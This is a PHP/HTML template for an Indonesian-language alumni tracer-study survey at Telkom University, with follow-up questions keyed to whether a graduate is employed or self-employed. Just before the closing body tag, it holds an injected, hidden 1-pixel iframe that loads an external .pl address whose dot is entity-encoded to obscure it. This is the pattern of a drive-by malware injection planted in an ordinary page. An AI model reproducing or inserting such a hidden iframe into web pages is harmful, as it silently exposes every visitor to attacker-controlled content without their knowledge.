<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">

    <title><?= $data['page']?></title>

    <!-- <link rel="canonical" href="https://getbootstrap.com/docs/4.0/examples/checkout/"> -->

    <!-- Bootstrap core CSS -->
    <link href="<?= $this->base_url;?>public/css/bootstrap.css" rel="stylesheet">
    <script src="<?= $this->base_url;?>public/js/bootstrap.js"></script>
  <script src="<?= $this->base_url;?>public/js/jquery-3.3.1.min.js"></script>
    <!-- Custom styles for this template -->
    <!-- <link href="form-validation.css" rel="stylesheet"> -->
  </head>

  <body class="bg-light">


  <body class="bg-light">

    <div class="container">
      <div class="py-5">
        <img class="d-block mx-auto mb-4" src="https://getbootstrap.com/docs/4.0/assets/brand/bootstrap-solid.svg" alt="" width="72" height="72">
        <h2><center>Tracer Study</center></h2>
        <p>Kepada yth, Para alumni Telkom University Lulusan 2017, mohon kesediaannya untuk meluangkan waktu dalam menjawab 34 pertanyaan terkait situasi lulusan selama masa transisi hingga 2 (dua) tahun setelah lulus. Data ini menjadi informasi yang penting dalam kegiatan Tracer Study di Telkom University.
        <br>
        Tracer study bertujuan untuk:
        <br>
        1. Mengetahui hasil pendidikan di masa transisi
        <br>
        2. Penilaian diri terhadap penguasaan dan kompetensi
        <br>
        3. Evaluasi proses pembelajaran & kontribusi pendidikan tinggi
        <br>
        4. Data tersebut sangat dibutuhkan untuk institusi yaitu dalam kegiatan Akreditasi</p>
      <?php if (isset($_SESSION['message'])) :?>
        <a href="<?= $this->base_url . "Home" ?>" class="btn btn-primary">kehalaman utama</a>
      <?php unset($_SESSION['message']);?>
      <?php endif;?>
      </div>
      <div class="row">
        <div class="col-md-12 order-md-1">
          <h4 class="mb-1">Kegiatan Anda Saat ini : </h4>
          <h5 class="mb-3"><?= $data['checkstats']?></h5>
      <?php if($data['checkstats'] == "bekerja(diperusahaan)") : ?>
          <form method="post" action="">
          <div class="form-group">
            <label>Kapan anda mulai bekerja?</label>
            <input type="date" class="form-control" name="sub-quest-date" required>
          </div>
            <button type="submit" name="here" class="btn btn-primary" >Submit!</button>
          </form>
          </div>
        </div>
        <?php endif; ?>
      <?php if($data['checkstats'] == "wiraswasta") : ?>
          <form method="post" action="">
          <div class="form-group">
            <label>Berapa lama waktu yang dihabiskan(sebelum atau sesudah kelulusan) untuk membangun usaha anda</label>
            <input type="text" class="form-control" name="sub-quest-date" required>
          </div>
            <button type="submit" name="here" class="btn btn-primary" >Submit!</button>
          </form>
          </div>
        </div>
        <?php endif; ?>
      <footer class="my-5 pt-5 text-muted text-center text-small">
        <p class="mb-1">&copy; 2017-2018 Company Name</p>
        <ul class="list-inline">
          <li class="list-inline-item"><a href="#">Privacy</a></li>
          <li class="list-inline-item"><a href="#">Terms</a></li>
          <li class="list-inline-item"><a href="#">Support</a></li>
        </ul>
      </footer>
    </div>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>
